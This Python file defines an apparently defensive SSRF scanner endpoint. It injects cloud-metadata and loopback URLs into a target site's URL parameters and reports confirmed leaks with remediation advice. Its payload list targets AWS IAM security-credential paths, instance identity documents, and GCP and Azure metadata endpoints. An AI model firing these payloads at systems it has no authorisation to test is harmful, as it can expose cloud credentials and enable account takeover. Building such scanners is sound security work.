"""SSRF (Server-Side Request Forgery) scanner.

Zero-FP via cloud-metadata content extraction. Inject URLs targeting
cloud metadata endpoints; if response contains the actual metadata
content (specific markers only metadata returns), SSRF is confirmed.

  AWS  EC2 metadata    -> "ami-id", "instance-id", "iam/", "security-credentials"
  GCP  metadata        -> "project-id", "service-accounts/default", "instance/zone"
  Azure metadata       -> "subscriptionId", "vmId", "compute" JSON keys
  Internal             -> response from 127.0.0.1 / [::1] / 169.254.169.254
"""
import re
import urllib.parse
from fastapi import APIRouter, Depends

from tools._shared import (
    ScanRequest, verify_scan_quota, web_url,
    safe_get, wrap_finding, standard_response,
)

router = APIRouter()


SSRF_PAYLOADS = [
    ("AWS EC2 metadata root",      "http://169.254.169.254/latest/meta-data/",
     r"ami-id|instance-id|iam/|security-credentials", "AWS"),
    ("AWS EC2 IAM role",           "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     r"\w+", "AWS"),
    ("AWS instance identity",      "http://169.254.169.254/latest/dynamic/instance-identity/document",
     r"instanceId|accountId|imageId|region", "AWS"),
    ("GCP metadata",               "http://metadata.google.internal/computeMetadata/v1/instance/",
     r"hostname|service-accounts|zone|machine-type", "GCP"),
    ("GCP project-id",             "http://metadata.google.internal/computeMetadata/v1/project/project-id",
     r"^[a-z][-a-z0-9]{5,29}$", "GCP"),
    ("Azure metadata",             "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     r"subscriptionId|vmId|resourceGroupName|computerName", "Azure"),
    ("Localhost SSH",              "http://127.0.0.1:22/",
     r"SSH-\d+\.\d+", "localhost SSH"),
    ("IPv6 localhost",             "http://[::1]/",
     r"localhost|<title>", "localhost"),
]


def _inject_param(url, param, value):
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)))


def _is_likely_app_response(body):
    lower = body[:500].lower()
    if "<!doctype html" in lower or "<html" in lower:
        return True
    return False


@router.post("/api/scan/ssrf")
async def scan_ssrf(req: ScanRequest, _=Depends(verify_scan_quota)):
    url = web_url(req.target)
    findings = []
    tests = 0
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    if not qs:
        return standard_response(
            tool="ssrf", target=req.target, findings=[],
            tests_performed=1, vulnerable=False,
            skipped_reason="No URL parameters present — append ?url=http://... (or similar) to test",
        )

    raw_results = []
    for param, _orig in qs.items():
        tests += 1
        confirmed = None
        for variant, payload, marker_re, cloud in SSRF_PAYLOADS:
            test_url = _inject_param(url, param, payload)
            r = safe_get(test_url, req=req, allow_redirects=True, timeout=12,
                         headers={"User-Agent": "VulnusLab/1.0", "Metadata-Flavor": "Google"})
            if r is None or r.status_code >= 500:
                continue
            body = (r.text or "")[:50000]
            if not body:
                continue
            if re.search(marker_re, body, re.M):
                if len(body) >= 5 and not _is_likely_app_response(body):
                    confirmed = {"variant": variant, "payload": payload, "cloud": cloud,
                                 "status_code": r.status_code,
                                 "body_snippet": body[:300].replace("\n", " ")}
                    break
        if confirmed:
            findings.append(wrap_finding(
                f"SSRF in parameter '{param}' — leaked {confirmed['cloud']} metadata",
                "CRITICAL", cwe="CWE-918", owasp="A10:2021",
                evidence_marker=f"payload `{confirmed['payload']}` returned HTTP {confirmed['status_code']} with {confirmed['cloud']} metadata content. Body: {confirmed['body_snippet'][:150]}",
                remediation="Validate URL parameters against an allow-list. Block requests to internal IPs (127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, ::1). Use IMDSv2 on AWS (requires PUT + token). Consider an egress proxy as defense-in-depth.",
                tests_performed=1,
                cvss="9.1",
            ))
            raw_results.append({"param": param, "result": "VULNERABLE", **confirmed})
        else:
            raw_results.append({"param": param, "result": "safe"})

    return standard_response(
        tool="ssrf", target=req.target, findings=findings,
        tests_performed=tests,
        tests_summary=f"Tested {tests} parameter(s) with {len(SSRF_PAYLOADS)} cloud-metadata/loopback payloads, confirmed by metadata content marker",
        raw_data={"ssrf": {"params_tested": tests, "vulnerable_count": len(findings), "results": raw_results}},
    )


def register(app):
    app.include_router(router)
